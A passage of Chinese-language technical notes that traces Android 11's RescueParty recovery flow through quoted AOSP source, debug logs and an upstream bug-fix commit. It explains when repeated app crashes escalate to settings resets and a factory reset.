\u5219\u6700\u7ec8\u6267\u884c\u5230 execute . http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/am/AppErrors.java 406 /** 407 * Bring up the \"unexpected error\" dialog box for a crashing app. 408 * Deal with edge cases (intercepts from instrumented applications, 409 * ActivityController, error intent receivers, that sort of thing). 410 * @param r the application crashing 411 * @param crashInfo describing the failure 412 */ 413 void crashApplication(ProcessRecord r, ApplicationErrorReport.CrashInfo crashInfo) { 414 final int callingPid = Binder.getCallingPid(); 415 final int callingUid = Binder.getCallingUid(); 416 417 final long origId = Binder.clearCallingIdentity(); 418 try { 419 crashApplicationInner(r, crashInfo, callingPid, callingUid); 420 } finally { 421 Binder.restoreCallingIdentity(origId); 422 } 423 } 425 void crashApplicationInner(ProcessRecord r, ApplicationErrorReport.CrashInfo crashInfo, 426 int callingPid, int callingUid) { 427 long timeMillis = System.currentTimeMillis(); 428 String shortMsg = crashInfo.exceptionClassName; 429 String longMsg = crashInfo.exceptionMessage; 430 String stackTrace = crashInfo.stackTrace; 431 if (shortMsg != null && longMsg != null) { 432 longMsg = shortMsg + \": \" + longMsg; 433 } else if (shortMsg != null) { 434 longMsg = shortMsg; 435 } 436 437 if (r != null) { 438 mPackageWatchdog.onPackageFailure(r.getPackageListWithVersionCode(), 439 PackageWatchdog.FAILURE_REASON_APP_CRASH); 440 441 mService.mProcessList.noteAppKill(r, (crashInfo != null 442 && \"Native crash\".equals(crashInfo.exceptionClassName)) 443 ? ApplicationExitInfo.REASON_CRASH_NATIVE 444 : ApplicationExitInfo.REASON_CRASH, 445 ApplicationExitInfo.SUBREASON_UNKNOWN, 446 \"crash\"); 447 } http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/PackageWatchdog.java 359 /** 360 * Called when a process fails due to a crash, ANR or explicit health check. 361 * 362 * <p>For each package contained in the process, one registered observer with the least user 363 * impact will be notified for mitigation. 364 * 365 * <p>This method could be called frequently if there is a severe problem on the device. 366 */ 367 public void onPackageFailure(List<VersionedPackage> packages, 368 @FailureReasons int failureReason) { 369 if (packages == null) { 370 Slog.w(TAG, \"Could not resolve a list of failing packages\"); 371 return; 372 } 373 mLongTaskHandler.post(() -> { 374 synchronized (mLock) { 375 if (mAllObservers.isEmpty()) { 376 return; 377 } 378 boolean requiresImmediateAction = (failureReason == FAILURE_REASON_NATIVE_CRASH 379 || failureReason == FAILURE_REASON_EXPLICIT_HEALTH_CHECK); 380 if (requiresImmediateAction) { 381 handleFailureImmediately(packages, failureReason); 382 } else { 383 for (int pIndex = 0; pIndex < packages.size(); pIndex++) { 384 VersionedPackage versionedPackage = packages.get(pIndex); 385 // Observer that will receive failure for versionedPackage 386 PackageHealthObserver currentObserverToNotify = null; 387 int currentObserverImpact = Integer.MAX_VALUE; 388 389 // Find observer with least user impact 390 for (int oIndex = 0; oIndex < mAllObservers.size(); oIndex++) { 391 ObserverInternal observer = mAllObservers.valueAt(oIndex); 392 PackageHealthObserver registeredObserver = observer.registeredObserver; 393 if (registeredObserver != null 394 && observer.onPackageFailureLocked( 395 versionedPackage.getPackageName())) { 396 int impact = registeredObserver.onHealthCheckFailed( 397 versionedPackage, failureReason); 398 if (impact != PackageHealthObserverImpact.USER_IMPACT_NONE 399 && impact < currentObserverImpact) { 400 currentObserverToNotify = registeredObserver; 401 currentObserverImpact = impact; 402 } 403 } 404 } 405 406 // Execute action with least user impact 407 if (currentObserverToNotify != null) { 408 currentObserverToNotify.execute(versionedPackage, failureReason); 409 } 410 } 411 } 412 } 413 }); 414 } http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/RescueParty.java 419 @Override 420 public int onHealthCheckFailed(@Nullable VersionedPackage failedPackage, 421 @FailureReasons int failureReason) { 422 if (!isDisabled() && (failureReason == PackageWatchdog.FAILURE_REASON_APP_CRASH 423 || failureReason == PackageWatchdog.FAILURE_REASON_APP_NOT_RESPONDING)) { 424 return mapRescueLevelToUserImpact(getNextRescueLevel()); 425 } else { 426 return PackageHealthObserverImpact.USER_IMPACT_NONE; 427 } 428 } \u901a\u8fc7\u52a0log, \u53d1\u73b0 onPackageFailure \u88ab\u8c03\u7528\u4e86, \u4f46\u662f currentObserverToNotify \u4e3a null , \u6240\u4ee5\u8ddf\u8e2a observer.onPackageFailureLocked \u67e5\u770b\u4e3a\u5565\u4e3a false : \u901a\u8fc7\u589e\u52a0log\u6253\u5370, \u53d1\u73b0 RescueParty \u5b58\u5728Bug: 11-08 08:55:37.174 1153 1403 W RescueParty: ==>packageName = com.demo 11-08 08:55:37.174 1153 1826 W ActivityTaskManager: Force finishing activity com.demo/.MainActivity 11-08 08:55:37.176 1153 1403 W RescueParty: NameNotFoundException 11-08 08:55:37.176 1153 1403 W RescueParty: android.content.pm.PackageManager$NameNotFoundException: No module info for package: com.demo 11-08 08:55:37.176 1153 1403 W RescueParty: at android.app.ApplicationPackageManager.getModuleInfo(ApplicationPackageManager.java:1010) 11-08 08:55:37.176 1153 1403 W RescueParty: at com.android.server.RescueParty$RescuePartyObserver.mayObservePackage(RescueParty.java:459) 11-08 08:55:37.176 1153 1403 W RescueParty: at com.android.server.PackageWatchdog$ObserverInternal.onPackageFailureLocked(PackageWatchdog.java:1125) 11-08 08:55:37.176 1153 1403 W RescueParty: at com.android.server.PackageWatchdog.lambda$onPackageFailure$4$PackageWatchdog(PackageWatchdog.java:398) 11-08 08:55:37.176 1153 1403 W RescueParty: at com.android.server.-$$Lambda$PackageWatchdog$Ya4lYGbdDy3Dda20wvc2AHBqIMM.run(Unknown Source:6) 11-08 08:55:37.176 1153 1403 W RescueParty: at android.os.Handler.handleCallback(Handler.java:938) 11-08 08:55:37.176 1153 1403 W RescueParty: at android.os.Handler.dispatchMessage(Handler.java:99) 11-08 08:55:37.176 1153 1403 W RescueParty: at android.os.Looper.loop(Looper.java:223) 11-08 08:55:37.176 1153 1403 W RescueParty: at android.os.HandlerThread.run(HandlerThread.java:67) 11-08 08:55:37.177 1153 1403 E PackageWatchdog: ==> onPackageFailureLocked : registeredObserver.mayObservePackage(packageName) = false http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/PackageWatchdog.java 551 /** Register instances of this interface to receive notifications on package failure. */ 552 public interface PackageHealthObserver { 1026 /** 1027 * Represents an observer monitoring a set of packages along with the failure thresholds for 1028 * each package. 1029 * 1030 * <p> Note, the PackageWatchdog#mLock must always be held when reading or writing 1031 * instances of this class. 1032 */ 1033 private static class ObserverInternal { 1034 public final String name; ... 1110 /** 1111 * Increments failure counts of {@code packageName}. 1112 * @returns {@code true} if failure threshold is exceeded, {@code false} otherwise 1113 */ 1114 @GuardedBy(\"mLock\") 1115 public boolean onPackageFailureLocked(String packageName) { 1116 if (packages.get(packageName) == null && registeredObserver.isPersistent() 1117 && registeredObserver.mayObservePackage(packageName)) { 1118 packages.put(packageName, sPackageWatchdog.newMonitoredPackage( 1119 packageName, DEFAULT_OBSERVING_DURATION_MS, false)); 1120 } 1121 MonitoredPackage p = packages.get(packageName); 1122 if (p != null) { 1123 return p.onFailureLocked(); 1124 } 1125 return false; 1126 } 94 public static final int FAILURE_REASON_UNKNOWN = 0; 95 public static final int FAILURE_REASON_NATIVE_CRASH = 1; 96 public static final int FAILURE_REASON_EXPLICIT_HEALTH_CHECK = 2; 97 public static final int FAILURE_REASON_APP_CRASH = 3; 98 public static final int FAILURE_REASON_APP_NOT_RESPONDING = 4; 389 public static class RescuePartyObserver implements PackageHealthObserver { 419 @Override 420 public int onHealthCheckFailed(@Nullable VersionedPackage failedPackage, 421 @FailureReasons int failureReason) { 422 if (!isDisabled() && (failureReason == PackageWatchdog.FAILURE_REASON_APP_CRASH 423 || failureReason == PackageWatchdog.FAILURE_REASON_APP_NOT_RESPONDING)) { 424 return mapRescueLevelToUserImpact(getNextRescueLevel()); 425 } else { 426 return PackageHealthObserverImpact.USER_IMPACT_NONE; 427 } 428 } 448 @Override 449 public boolean isPersistent() { 450 return true; 451 } 452 453 @Override 454 public boolean mayObservePackage(String packageName) { 455 PackageManager pm = mContext.getPackageManager(); 456 try { 457 // A package is a module if this is non-null 458 if (pm.getModuleInfo(packageName, 0) != null) { 459 return true; 460 } 461 } catch (PackageManager.NameNotFoundException ignore) { 462 } 463 464 try { 465 ApplicationInfo info = pm.getApplicationInfo(packageName, 0); 466 return (info.flags & PERSISTENT_MASK) == PERSISTENT_MASK; 467 } catch (PackageManager.NameNotFoundException e) { 468 return false; 469 } 470 } \u627e\u5230Android11\u4e0a\u7684diff : https://github.com/aosp-mirror/platform_frameworks_base/commit/f2abc4e6fa6ed79462e0ddfc6ede526edc646378 , \u6ce8\u91ca\u5185\u5bb9: Fix Rescue Party observability criteria The previous behavior erroneously returned if the package was not found by PackageManager#getModuleInfo, which means the persistent process check would never be performed. This caused packages like com.android.systemui to not be handled by Rescue Party's mitigation logic. Instead, ensure that both cases are checked. Test: setprop persist.sys.enable_rescue true, adb shell setprop debug.crash_sysui 1, adb shell kill `pidof com.android.systemui`, ensure recovery mode is reached Bug: 169284310 Change-Id: Ifec19b8daba1dacc7f5efcfa47ed3c3a046612e3 \u4fee\u590d\u540e, \u62d4\u6389 USB \u8c03\u8bd5\u7ebf, \u6210\u529f\u8fdb\u5165Recovery\u6a21\u5f0f:","title":"2 \u76d1\u542cAPP\u53d1\u751f\u4e86\u7cdf\u7cd5\u7684\u5d29\u6e83"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#3-rescueparty","text":"\u6d4b\u8bd5\u60c5\u51b5\u624b\u52a8\u8bbe\u7f6e\u5c5e\u6027 persist.sys.enable_rescue \u8fdb\u5165\u6551\u63f4\u6a21\u5f0f; \u7cfb\u7edf\u56de\u6eda\u540e, \u901a\u8fc7\u8bbe\u7f6e\u5c5e\u6027 persist.device_config.configuration.disable_rescue_party , \u4e0d\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f; \u5de5\u7a0b\u7248\u672c, \u4e0d\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f; userdebug \u7248\u672c\u4e14 adb \u53ef\u7528, \u4e0d\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f; \u5f53 persist.sys.disable_rescue \u88ab\u8bbe\u7f6e\u4e3a true , \u4e0d\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f; \u5426\u5219\u70ed\u91cd\u542f\u540e\u5c31\u4f1a\u6267\u884c\u91cd\u7f6e\u64cd\u4f5c. http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/RescueParty.java 75 @VisibleForTesting 76 static final String PROP_ENABLE_RESCUE = \"persist.sys.enable_rescue\"; 99 private static final String PROP_DISABLE_RESCUE = \"persist.sys.disable_rescue\"; 101 private static final String PROP_DEVICE_CONFIG_DISABLE_FLAG = 102 \"persist.device_config.configuration.disable_rescue_party\"; 113 private static boolean isDisabled() { 114 // Check if we're explicitly enabled for testing 115 if (SystemProperties.getBoolean(PROP_ENABLE_RESCUE, false)) { 116 return false; 117 } 118 119 // We're disabled if the DeviceConfig disable flag is set to true. 120 // This is in case that an emergency rollback of the feature is needed. 121 if (SystemProperties.getBoolean(PROP_DEVICE_CONFIG_DISABLE_FLAG, false)) { 122 Slog.v(TAG, \"Disabled because of DeviceConfig flag\"); 123 return true; 124 } 125 126 // We're disabled on all engineering devices 127 if (Build.IS_ENG) { 128 Slog.v(TAG, \"Disabled because of eng build\"); 129 return true; 130 } 131 132 // We're disabled on userdebug devices connected over USB, since that's 133 // a decent signal that someone is actively trying to debug the device, 134 // or that it's in a lab environment. 135 if (Build.IS_USERDEBUG && isUsbActive()) { 136 Slog.v(TAG, \"Disabled because of active USB connection\"); 137 return true; 138 } 139 140 // One last-ditch check 141 if (SystemProperties.getBoolean(PROP_DISABLE_RESCUE, false)) { 142 Slog.v(TAG, \"Disabled because of manual property\"); 143 return true; 144 } 145 146 return false; 147 } 389 public static class RescuePartyObserver implements PackageHealthObserver { ... 430 @Override 431 public boolean execute(@Nullable VersionedPackage failedPackage, 432 @FailureReasons int failureReason) { 433 if (isDisabled()) { 434 return false; 435 } 436 if (failureReason == PackageWatchdog.FAILURE_REASON_APP_CRASH 437 || failureReason == PackageWatchdog.FAILURE_REASON_APP_NOT_RESPONDING) { 438 int triggerUid = getPackageUid(mContext, failedPackage.getPackageName()); 439 incrementRescueLevel(triggerUid); 440 executeRescueLevel(mContext, 441 failedPackage == null ? null : failedPackage.getPackageName()); 442 return true; 443 } else { 444 return false; 445 } 446 } 472 @Override 473 public int onBootLoop() { 474 if (isDisabled()) { 475 return PackageHealthObserverImpact.USER_IMPACT_NONE; 476 } 477 return mapRescueLevelToUserImpact(getNextRescueLevel()); 478 } 479 480 @Override 481 public boolean executeBootLoopMitigation() { 482 if (isDisabled()) { 483 return false; 484 } 485 incrementRescueLevel(Process.ROOT_UID); 486 executeRescueLevel(mContext, /*failedPackage=*/ null); 487 return true; 488 } 540 /** 541 * Hacky test to check if the device has an active USB connection, which is 542 * a good proxy for someone doing local development work. 543 */ 544 private static boolean isUsbActive() { 545 if (SystemProperties.getBoolean(PROP_VIRTUAL_DEVICE, false)) { 546 Slog.v(TAG, \"Assuming virtual device is connected over USB\"); 547 return true; 548 } 549 try { 550 final String state = FileUtils 551 .readTextFile(new File(\"/sys/class/android_usb/android0/state\"), 128, \"\"); 552 return \"CONFIGURED\".equals(state.trim()); 553 } catch (Throwable t) { 554 Slog.w(TAG, \"Failed to determine if device was on USB\", t); 555 return false; 556 } 557 }","title":"3 RescueParty\u6267\u884c\u91cd\u7f6e\u7684\u6761\u4ef6"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#4-rescueparty","text":"executeRescueLevel \u65f6, RescueParty \u6309 sys.rescue_level \u8bbe\u7f6e\u7684 level \u987a\u5e8f\u9010\u6e10\u52a0\u5f3a: - LEVEL_NONE : \u672a\u8bbe\u7f6e\u6216\u8bbe\u7f6e\u4e3a0, \u76f4\u63a5\u8fd4\u56de - LEVEL_RESET_SETTINGS_UNTRUSTED_DEFAULTS : \u91cd\u7f6eSetting\u914d\u7f6e, - LEVEL_RESET_SETTINGS_UNTRUSTED_CHANGES : \u91cd\u7f6eSetting\u914d\u7f6e, - LEVEL_RESET_SETTINGS_TRUSTED_DEFAULTS : \u91cd\u7f6eSetting\u914d\u7f6e, - LEVEL_FACTORY_RESET : \u6062\u590d\u51fa\u5382\u8bbe\u7f6e\u5e76\u6e05\u9664\u7528\u6237\u6570\u636e http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/RescueParty.java 224 /** 225 * Get the next rescue level. This indicates the next level of mitigation that may be taken. 226 */ 227 private static int getNextRescueLevel() { 228 return MathUtils.constrain(SystemProperties.getInt(PROP_RESCUE_LEVEL, LEVEL_NONE) + 1, 229 LEVEL_NONE, LEVEL_FACTORY_RESET); 230 } 231 232 /** 233 * Escalate to the next rescue level. After incrementing the level you'll 234 * probably want to call {@link #executeRescueLevel(Context, String)}. 235 */ 236 private static void incrementRescueLevel(int triggerUid) { 237 final int level = getNextRescueLevel(); 238 SystemProperties.set(PROP_RESCUE_LEVEL, Integer.toString(level)); 239 240 EventLogTags.writeRescueLevel(level, triggerUid); 241 logCriticalInfo(Log.WARN, \"Incremented rescue level to \" 242 + levelToString(level) + \" triggered by UID \" + triggerUid); 243 } 75 @VisibleForTesting 76 static final String PROP_ENABLE_RESCUE = \"persist.sys.enable_rescue\"; 77 @VisibleForTesting 78 static final String PROP_RESCUE_LEVEL = \"sys.rescue_level\"; 79 @VisibleForTesting 80 static final int LEVEL_NONE = 0; 81 @VisibleForTesting 82 static final int LEVEL_RESET_SETTINGS_UNTRUSTED_DEFAULTS = 1; 83 @VisibleForTesting 84 static final int LEVEL_RESET_SETTINGS_UNTRUSTED_CHANGES = 2; 85 @VisibleForTesting 86 static final int LEVEL_RESET_SETTINGS_TRUSTED_DEFAULTS = 3; 87 @VisibleForTesting 88 static final int LEVEL_FACTORY_RESET = 4; 245 private static void executeRescueLevel(Context context, @Nullable String failedPackage) { 246 final int level = SystemProperties.getInt(PROP_RESCUE_LEVEL, LEVEL_NONE); 247 if (level == LEVEL_NONE) return; 248 249 Slog.w(TAG, \"Attempting rescue level \" + levelToString(level)); 250 try { 251 executeRescueLevelInternal(context, level, failedPackage); 252 EventLogTags.writeRescueSuccess(level); 253 logCriticalInfo(Log.DEBUG, 254 \"Finished rescue level \" + levelToString(level)); 255 } catch (Throwable t) { 256 logRescueException(level, t); 257 } 258 } 260 private static void executeRescueLevelInternal(Context context, int level, @Nullable 261 String failedPackage) throws Exception { 262 FrameworkStatsLog.write(FrameworkStatsLog.RESCUE_PARTY_RESET_REPORTED, level); 263 switch (level) { 264 case LEVEL_RESET_SETTINGS_UNTRUSTED_DEFAULTS: 265 resetAllSettings(context, Settings.RESET_MODE_UNTRUSTED_DEFAULTS, failedPackage); 266 break; 267 case LEVEL_RESET_SETTINGS_UNTRUSTED_CHANGES: 268 resetAllSettings(context, Settings.RESET_MODE_UNTRUSTED_CHANGES, failedPackage); 269 break; 270 case LEVEL_RESET_SETTINGS_TRUSTED_DEFAULTS: 271 resetAllSettings(context, Settings.RESET_MODE_TRUSTED_DEFAULTS, failedPackage); 272 break; 273 case LEVEL_FACTORY_RESET: 274 // Request the reboot from a separate thread to avoid deadlock on PackageWatchdog 275 // when device shutting down. 276 Runnable runnable = new Runnable() { 277 @Override 278 public void run() { 279 try { 280 RecoverySystem.rebootPromptAndWipeUserData(context, TAG); 281 } catch (Throwable t) { 282 logRescueException(level, t); 283 } 284 } 285 }; 286 Thread thread = new Thread(runnable); 287 thread.start(); 288 break; 289 } 290 } 321 private static void resetAllSettings(Context context, int mode, @Nullable String failedPackage) 322 throws Exception { 323 // Try our best to reset all settings possible, and once finished 324 // rethrow any exception that we encountered 325 Exception res = null; 326 final ContentResolver resolver = context.getContentResolver(); 327 try { 328 resetDeviceConfig(context, mode, failedPackage); 329 } catch (Exception e) { 330 res = new RuntimeException(\"Failed to reset config settings\", e); 331 } 332 try { 333 Settings.Global.resetToDefaultsAsUser(resolver, null, mode, UserHandle.USER_SYSTEM); 334 } catch (Exception e) { 335 res = new RuntimeException(\"Failed to reset global settings\", e); 336 } 337 for (int userId : getAllUserIds()) { 338 try { 339 Settings.Secure.resetToDefaultsAsUser(resolver, null, mode, userId); 340 } catch (Exception e) { 341 res = new RuntimeException(\"Failed to reset secure settings for \" + userId, e); 342 } 343 } 344 if (res != null) { 345 throw res; 346 } 347 } log/tar_logcat.02/logcat.log_1.42:11-03 05:05:34.228 879 909 W PackageManager: Incremented rescue level to RESET_SETTINGS_UNTRUSTED_DEFAULTS triggered by UID 1000 log/tar_logcat.02/logcat.log_1.42:11-03 05:05:35.859 879 909 W PackageManager: Incremented rescue level to RESET_SETTINGS_UNTRUSTED_CHANGES triggered by UID 1000 log/tar_logcat.02/logcat.log_1.42:11-03 05:05:37.289 879 909 W PackageManager: Incremented rescue level to RESET_SETTINGS_TRUSTED_DEFAULTS triggered by UID 1000 log/tar_logcat.02/logcat.log_1.42:11-03 05:05:40.503 879 909 W PackageManager: Incremented rescue level to FACTORY_RESET triggered by UID 1000","title":"4 RescueParty\u6267\u884c\u91cd\u7f6e"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#5","text":"\u6062\u5382\u4f20\u7ed9\u53c2\u6570reason\u7684\u503c\u662fTAG (RescueParty), http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/core/java/android/os/RecoverySystem.java 107 /** Used to communicate with recovery. See bootable/recovery/recovery.cpp. */ 108 private static final File RECOVERY_DIR = new File(\"/cache/recovery\"); 109 private static final File LOG_FILE = new File(RECOVERY_DIR, \"log\"); 1162 /** 1163 * Called after booting to process and remove recovery-related files. 1164 * @return the log file from recovery, or null if none was found. 1165 * 1166 * @hide 1167 */ 1168 public static String handleAftermath(Context context) { 1169 // Record the tail of the LOG_FILE 1170 String log = null; 1171 try { 1172 log = FileUtils.readTextFile(LOG_FILE, -LOG_FILE_MAX_LENGTH, \"...\\n\"); 1173 } catch (FileNotFoundException e) { 1174 Log.i(TAG, \"No recovery log file\"); 1175 } catch (IOException e) { 1176 Log.e(TAG, \"Error reading recovery log\", e); 1177 } 1050 /** {@hide} */ 1051 public static void rebootPromptAndWipeUserData(Context context, String reason) 1052 throws IOException { 1053 boolean checkpointing = false; 1054 boolean needReboot = false; 1055 IVold vold = null; 1056 try { 1057 vold = IVold.Stub.asInterface(ServiceManager.checkService(\"vold\")); 1058 if (vold != null) { 1059 checkpointing = vold.needsCheckpoint(); 1060 } else { 1061 Log.w(TAG, \"Failed to get vold\"); 1062 } 1063 } catch (Exception e) { 1064 Log.w(TAG, \"Failed to check for checkpointing\"); 1065 } 1066 1067 // If we are running in checkpointing mode, we should not prompt a wipe. 1068 // Checkpointing may save us. If it doesn't, we will wind up here again. 1069 if (checkpointing) { 1070 try { 1071 vold.abortChanges(\"rescueparty\", false); 1072 Log.i(TAG, \"Rescue Party requested wipe. Aborting update\"); 1073 } catch (Exception e) { 1074 Log.i(TAG, \"Rescue Party requested wipe. Rebooting instead.\"); 1075 PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE); 1076 pm.reboot(\"rescueparty\"); 1077 } 1078 return; 1079 } 1080 1081 String reasonArg = null; 1082 if (!TextUtils.isEmpty(reason)) { 1083 reasonArg = \"--reason=\" + sanitizeArg(reason); 1084 } 1085 1086 final String localeArg = \"--locale=\" + Locale.getDefault().toString(); 1087 bootCommand(context, null, \"--prompt_and_wipe_data\", reasonArg, localeArg); 1088 } 1138 /** 1139 * Reboot into the recovery system with the supplied argument. 1140 * @param args to pass to the recovery utility. 1141 * @throws IOException if something goes wrong. 1142 */ 1143 private static void bootCommand(Context context, String... args) throws IOException { 1144 LOG_FILE.delete(); 1145 1146 StringBuilder command = new StringBuilder(); 1147 for (String arg : args) { 1148 if (!TextUtils.isEmpty(arg)) { 1149 command.append(arg); 1150 command.append(\"\\n\"); 1151 } 1152 } 1153 1154 // Write the command into BCB (bootloader control block) and boot from 1155 // there. Will not return unless failed. 1156 RecoverySystem rs = (RecoverySystem) context.getSystemService(Context.RECOVERY_SERVICE); 1157 rs.rebootRecoveryWithCommand(command.toString()); 1158 1159 throw new IOException(\"Reboot failed (no permissions?)\"); 1160 } http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/recoverysystem/RecoverySystemService.java#276 275 @Override // Binder call 276 public void rebootRecoveryWithCommand(String command) { 277 if (DEBUG) Slog.d(TAG, \"rebootRecoveryWithCommand: [\" + command + \"]\"); 278 synchronized (sRequestLock) { 279 if (!setupOrClearBcb(true, command)) { 280 return; 281 } 282 283 // Having set up the BCB, go ahead and reboot. 284 PowerManager pm = mInjector.getPowerManager(); 285 pm.reboot(PowerManager.REBOOT_RECOVERY); 286 } 287 } http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/power/PowerManagerService.java#126 5128 /** 5129 * Reboots the device. 5130 * 5131 * @param confirm If true, shows a reboot confirmation dialog. 5132 * @param reason The reason for the reboot, or null if none. 5133 * @param wait If true, this call waits for the reboot to complete and does not return. 5134 */ 5135 @Override // Binder call 5136 public void reboot(boolean confirm, @Nullable String reason, boolean wait) { 5137 mContext.enforceCallingOrSelfPermission(android.Manifest.permission.REBOOT, null); 5138 if (PowerManager.REBOOT_RECOVERY.equals(reason) 5139 || PowerManager.REBOOT_RECOVERY_UPDATE.equals(reason)) { 5140 mContext.enforceCallingOrSelfPermission(android.Manifest.permission.RECOVERY, null); 5141 } 5142 5143 final long ident = Binder.clearCallingIdentity(); 5144 try { 5145 shutdownOrRebootInternal(HALT_MODE_REBOOT, confirm, reason, wait); 5146 } finally { 5147 Binder.restoreCallingIdentity(ident); 5148 } 5149 }","title":"5 \u6062\u590d\u51fa\u5382"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#6","text":"\u51fd\u6570 setupOrClearBcb \u8bbe\u7f6e\u5c5e\u6027 ctl.start \u4e3a setup-bcb , \u7136\u540e\u628a\u547d\u4ee4\u53d1\u7ed9 UncryptSocket http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/recoverysystem/RecoverySystemService.java 415 private boolean setupOrClearBcb(boolean isSetup, String command) { 416 mContext.enforceCallingOrSelfPermission(android.Manifest.permission.RECOVERY, null); 417 418 final boolean available = checkAndWaitForUncryptService(); 419 if (!available) { 420 Slog.e(TAG, \"uncrypt service is unavailable.\"); 421 return false; 422 } 423 424 if (isSetup) { 425 mInjector.systemPropertiesSet(\"ctl.start\", \"setup-bcb\"); 426 } else { 427 mInjector.systemPropertiesSet(\"ctl.start\", \"clear-bcb\"); 428 } 429 430 // Connect to the uncrypt service socket. 431 UncryptSocket socket = mInjector.connectService(); 432 if (socket == null) { 433 Slog.e(TAG, \"Failed to connect to uncrypt socket\"); 434 return false; 435 } 436 437 try { 438 // Send the BCB commands if it's to setup BCB. 439 if (isSetup) { 440 socket.sendCommand(command); 441 } 442 443 // Read the status from the socket. 444 int status = socket.getPercentageUncrypted(); 445 446 // Ack receipt of the status code. uncrypt waits for the ack so 447 // the socket won't be destroyed before we receive the code. 448 socket.sendAck(); 449 450 if (status == 100) { 451 Slog.i(TAG, \"uncrypt \" + (isSetup ? \"setup\" : \"clear\") 452 + \" bcb successfully finished.\"); 453 } else { 454 // Error in /system/bin/uncrypt. 455 Slog.e(TAG, \"uncrypt failed with status: \" + status); 456 return false; 457 } 458 } catch (IOException e) { 459 Slog.e(TAG, \"IOException when communicating with uncrypt:\", e); 460 return false; 461 } finally { 462 socket.close(); 463 } 464 465 return true; 466 } 61 // The socket at /dev/socket/uncrypt to communicate with uncrypt. 62 private static final String UNCRYPT_SOCKET = \"uncrypt\"; 468 /** 469 * Provides a wrapper for the low-level details of framing packets sent to the uncrypt 470 * socket. 471 */ 472 public static class UncryptSocket { 473 private LocalSocket mLocalSocket; 474 private DataInputStream mInputStream; 475 private DataOutputStream mOutputStream; 485 public boolean connectService() { 486 mLocalSocket = new LocalSocket(); 487 boolean done = false; 488 // The uncrypt socket will be created by init upon receiving the 489 // service request. It may not be ready by this point. So we will 490 // keep retrying until success or reaching timeout. 491 for (int retry = 0; retry < SOCKET_CONNECTION_MAX_RETRY; retry++) { 492 try { 493 mLocalSocket.connect(new LocalSocketAddress(UNCRYPT_SOCKET, 494 LocalSocketAddress.Namespace.RESERVED)); 495 done = true; 496 break; 522 /** 523 * Sends a command to the uncrypt service. 524 * 525 * @param command command to send to the uncrypt service 526 * @throws IOException if there was an error writing to the socket 527 */ 528 public void sendCommand(String command) throws IOException { 529 byte[] cmdUtf8 = command.getBytes(StandardCharsets.UTF_8); 530 mOutputStream.writeInt(cmdUtf8.length); 531 mOutputStream.write(cmdUtf8, 0, cmdUtf8.length); 532 } main \u51fd\u6570\u80fd\u591f\u770b\u5230 uncrypt \u5e94\u7528\u521b\u5efa\u4e86 socket , \u7b49\u5f85\u6570\u636e, \u4ecelog\u4e2d\u770b\u5230\u6570\u636e\u683c\u5f0f\u5982\u4e0b: log/log/log/tar_logcat.01/logcat.log.35:11-07 10:58:39.062 7027 7027 I uncrypt : received command: [--prompt_and_wipe_data log/log/log/tar_logcat.01/logcat.log.35-11-07 10:58:39.062 7027 7027 I uncrypt : --reason=RescueParty log/log/log/tar_logcat.01/logcat.log.35-11-07 10:58:39.062 7027 7027 I uncrypt : --locale=zh_CN log/log/log/tar_logcat.01/logcat.log.35-11-07 10:58:39.062 7027 7027 I uncrypt : ] (59) http://www.aospxref.com/android-11.0.0_r21/xref/bootable/recovery/uncrypt/uncrypt.cpp 60 * b2. create socket at 61 * /dev/socket/uncrypt 135 // UNCRYPT service still needs files on /cache partition (UNCRYPT_PATH_FILE 136 // and CACHE_BLOCK_MAP). It will be working (and needed) only for non-A/B 137 // devices, on which /cache partitions always exist. 138 static const std::string CACHE_BLOCK_MAP = \"/cache/recovery/block.map\"; 139 static const std::string UNCRYPT_PATH_FILE = \"/cache/recovery/uncrypt_file\"; 140 static const std::string UNCRYPT_STATUS = \"/cache/recovery/uncrypt_status\"; 141 static const std::string UNCRYPT_SOCKET = \"uncrypt\"; 567 static bool setup_bcb(const int socket) { 568 // c5. receive message length 569 int length; 570 if (!android::base::ReadFully(socket, &length, 4)) { 571 PLOG(ERROR) << \"failed to read the length\"; 572 return false; 573 } 574 length = ntohl(length); 575 576 // c7. receive message 577 std::string content; 578 content.resize(length); 579 if (!android::base::ReadFully(socket, &content[0], length)) { 580 PLOG(ERROR) << \"failed to read the message\"; 581 return false; 582 } 583 LOG(INFO) << \" received command: [\" << content << \"] (\" << content.size() << \")\"; 584 std::vector<std::string> options = android::base::Split(content, \"\\n\"); 585 std::string wipe_package; 586 for (auto& option : options) { 587 if (android::base::StartsWith(option, \"--wipe_package=\")) { 588 std::string path = option.substr(strlen(\"--wipe_package=\")); 589 if (!android::base::ReadFileToString(path, &wipe_package)) { 590 PLOG(ERROR) << \"failed to read \" << path; 591 return false; 592 } 593 option = android::base::StringPrintf(\"--wipe_package_size=%zu\", wipe_package.size()); 594 } 595 } 596 597 // c8. setup the bcb command 598 std::string err; 599 if (!write_bootloader_message(options, &err)) { 600 LOG(ERROR) << \"failed to set bootloader message: \" << err; 601 write_status_to_socket(-1, socket); 602 return false; 603 } 604 if (!wipe_package.empty() && !write_wipe_package(wipe_package, &err)) { 605 PLOG(ERROR) << \"failed to set wipe package: \" << err; 606 write_status_to_socket(-1, socket); 607 return false; 608 